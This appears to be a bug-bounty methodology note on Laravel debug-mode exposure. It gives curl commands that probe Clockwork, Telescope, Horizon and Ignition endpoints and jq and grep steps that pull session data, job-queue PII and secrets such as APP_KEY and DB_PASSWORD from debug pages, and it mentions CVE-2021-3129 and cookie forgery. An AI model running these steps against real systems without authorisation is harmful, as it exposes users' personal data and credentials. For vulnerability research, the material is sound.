---
type: pattern
vuln_class: debug-tools-in-production
last_updated: 2026-06-03
seen_in: []
tags:
  - bb-pattern
---

# Pattern: Laravel Debug Chain

> `APP_DEBUG=true` is not a single vulnerability -- it is a multiplier: one root cause commonly produces 3-4 separately reportable findings.

## Why This Is a Real Vulnerability, Not Noise

Laravel's debug tools each have an independent impact surface: Ignition can lead to RCE (CVE-2021-3129), Horizon leaks real PII from job queues (emails/phone numbers/case IDs), Clockwork leaks request history, and Whoops/Ignition stack traces contain env variables and source code paths. Each tool has a different "impact," and triagers typically accept separate reports (though the shared root cause should be mentioned in each report).

**Cut-loss decision**: `/_ignition/execute-solution`'s `ensureLocalRequest()` uses a TCP IP check that **cannot be bypassed** (X-Forwarded-For, X-Real-IP, Proxy headers are all ineffective). If the app is behind a proxy and your request's TCP IP is not 127.0.0.1, cut your losses on CVE-2021-3129 immediately and only report the stack trace + env leak.

---

## Detection Signals

| Signal | Meaning |
|--------|---------|
| HTTP 405 / 500 response body > 100KB HTML | Almost certainly an Ignition or Whoops stack trace, containing env + source |
| `/__clockwork` returns 200 JSON | Clockwork not disabled -- request history + routes + query leak |
| `/telescope` returns 200 HTML | Laravel Telescope dashboard open -- full request/response/job history |
| `/horizon` returns 200 HTML | Horizon dashboard open -- job payloads contain PII |
| `/_ignition/execute-solution` returns 200 | Ignition open; CVE-2021-3129 potential RCE (TCP IP check required) |
| `X-Clockwork-Id` response header | Page has Clockwork enabled, `/__clockwork/{id}` can retrieve full request details |
| `<meta name="clockwork-id">` in HTML source | Same as above |
| Response contains `APP_KEY`, `DB_PASSWORD`, `MAIL_PASSWORD` | Whoops/Ignition env dump, Critical |

---

## Grep / Test Methodology

### Step 1: Quick Fingerprinting

```bash
TARGET="https://target.example.com"

# Large response = stack trace
curl -si "${TARGET}/nonexistent-route-$(date +%s)" | head -5
curl -si "${TARGET}/nonexistent-route-$(date +%s)" | wc -c   # >100KB = debug page

# Clockwork
curl -si "${TARGET}/__clockwork" | head -10
curl -si "${TARGET}/__clockwork/requests" | head -10

# Telescope
curl -si "${TARGET}/telescope" | head -5
curl -si "${TARGET}/telescope/requests" | head -5

# Horizon
curl -si "${TARGET}/horizon" | head -5
curl -si "${TARGET}/horizon/api/jobs/recent" | head -10

# Ignition
curl -si -X POST "${TARGET}/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{"solution":"Facade\Ignition\Solutions\MakeViewVariableOptionalSolution","parameters":{}}' | head -10
```

### Step 2: Clockwork -- Extract PII and Routes

```bash
# Fetch the 50 most recent requests
curl -s "${TARGET}/__clockwork/requests?limit=50" | jq '.data[] | {id, method, uri, time}'

# Fetch full data for a single request (including session, cookies, DB queries)
curl -s "${TARGET}/__clockwork/{request_id}" | jq '{
  request: .request,
  session: .session,
  database_queries: .databaseQueries,
  routes: .routes
}'
```

### Step 3: Horizon -- Extract Job Payload PII

```bash
# Recent failed jobs (richest in PII)
curl -s "${TARGET}/horizon/api/jobs/failed?status=failed" | jq '.jobs[] | {id, displayName, payload}'

# All pending jobs
curl -s "${TARGET}/horizon/api/jobs/pending" | jq '.'

# Metrics (confirm system scale)
curl -s "${TARGET}/horizon/api/metrics/jobs" | jq '.'
```

PII severity ranking: Horizon job payload (emails/phone numbers/case IDs/transaction data) > Clockwork session (user tokens/session data) > Clockwork request log (URL params)

### Step 4: Ignition CVE-2021-3129 RCE Feasibility Assessment

```bash
# First confirm TCP IP (most important)
# If your curl hits the app server directly from the public internet -> TCP IP is not 127.0.0.1 -> cut losses
# If the app is on a VPS and Laravel directly listens on 0.0.0.0 -> possible (but still requires debug=true)

# Confirm Ignition version (if you can trigger a stack trace)
# Ignition < 2.5.2 = CVE-2021-3129 RCE via log file PHAR deserialization

# Test request (does NOT execute code, only confirms endpoint existence)
curl -si -X POST "${TARGET}/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{"solution":"Facade\Ignition\Solutions\GenerateMissingAppKey","parameters":{}}' | head -5
# 200 = endpoint exists; 403 = ensureLocalRequest blocked
```

### Step 5: Whoops / Ignition Stack Trace -- Env Extraction

```bash
# Trigger a 500 error (safe method: harmless route)
curl -si "${TARGET}/some-invalid-route" > /tmp/debug_page.html
wc -c /tmp/debug_page.html   # >100KB = debug page present

# Extract environment variables from HTML
grep -oP '(?<=APP_KEY["\s:]+)[^\s"<]+' /tmp/debug_page.html
grep -oP '(?<=DB_PASSWORD["\s:]+)[^\s"<]+' /tmp/debug_page.html
grep -oP '(?<=MAIL_PASSWORD["\s:]+)[^\s"<]+' /tmp/debug_page.html

# Ignition pages have JSON data blocks, easier to parse
grep -oP '"env"\s*:\s*\{[^}]+\}' /tmp/debug_page.html | python3 -m json.tool 2>/dev/null || true
```

---

## Variants / Chain

### Basic Chain (Most Common)

```
APP_DEBUG=true
  -> Ignition stack trace (500 on any error)    -> env var leak (APP_KEY, DB_*, MAIL_*)
  -> Clockwork enabled                          -> request history + session + DB queries
  -> Telescope enabled                          -> full request/response history
  -> Horizon enabled                            -> job queue PII (email, phone, tx IDs)
  -> Ignition execute-solution                  -> CVE-2021-3129 RCE (if TCP IP allows)
```

Each tool can be reported independently (different endpoint, different CWE, different impact), but the root cause is the same and should be mentioned in each report.

### PII Severity Chain

```
Horizon job payload (highest)
  -> Contains real user emails, phone numbers, case IDs, transaction amounts
  -> P2 (High) -- production user PII directly leaked

Clockwork session data (second highest)
  -> Contains session tokens, authenticated user IDs
  -> P2-P3 -- depends on whether tokens can be directly reused

Clockwork request log (baseline)
  -> URL params, query strings, referer
  -> P3-P4 -- depends on whether sensitive parameters are present
```

### Advanced: APP_KEY Leak -> Cookie Forgery / RCE

If Whoops/Ignition dumps the `APP_KEY` (base64 AES key):

```bash
# APP_KEY can be used to forge Laravel session cookies
# php-laravel-cookie-tool or laravel-cookie-forge tools
# Impact escalates to Critical (ATO or RCE via unserialize)
```

---

## Severity Guide

| What Was Found | Severity | Notes |
|----------------|----------|-------|
| Ignition RCE (CVE-2021-3129, TCP IP verified) | P1 Critical | Remote code execution, requires debug=true + old Ignition |
| APP_KEY leak (stack trace) | P1-P2 Critical/High | Can forge session cookies -> ATO; depends on app scale |
| Horizon job PII (real user emails/phone numbers) | P2 High | Production PII directly exposed to unauthorized visitors |
| DB_PASSWORD / MAIL_PASSWORD leak | P2 High | Credential leak |
| Clockwork session data + user IDs | P2-P3 High/Medium | Depends on token usability |
| Telescope full request/response log | P2-P3 | Depends on data sensitivity |
| Clockwork request log (no session) | P3-P4 Medium | Request history, depends on whether sensitive params are present |
| Pure stack trace (path + class leak) | P4-P5 Low | Information disclosure, OSINT assist value |

**Important**: When reporting separately under the same root cause (APP_DEBUG=true), each report must explain "the specific impact exposed by this tool" -- you cannot simply say "debug mode is on."

---

## Three-Question Check (Before Submission)

1. **What can an attacker obtain?** Concrete data (PII/credentials/tokens) or just path disclosure?
2. **Is this default behavior?** Laravel `APP_DEBUG=false` is the production default; enabling it is an active misconfiguration.
3. **What remains after removing theoretical elements?** If Ignition RCE is blocked by TCP IP, what remains is just a stack trace -- downgrade the report.

---

## Cross-reference

- [[Pattern - Spring Boot Actuator Unauth RCE]] -- Similar "debug/management endpoint exposed" root cause, different framework
- [[Pattern - Source Map Exposure]] -- Also a development tool left in production
- [[Pattern - Git Exposure]] -- Another class of development artifact leak
- [[Lessons Learned]] -- `feedback_405_500_large_response_debug_page`, `feedback_ignition_tcp_ip_check`, `feedback_laravel_debug_attack_chain`, `feedback_horizon_pii_richer_than_clockwork`
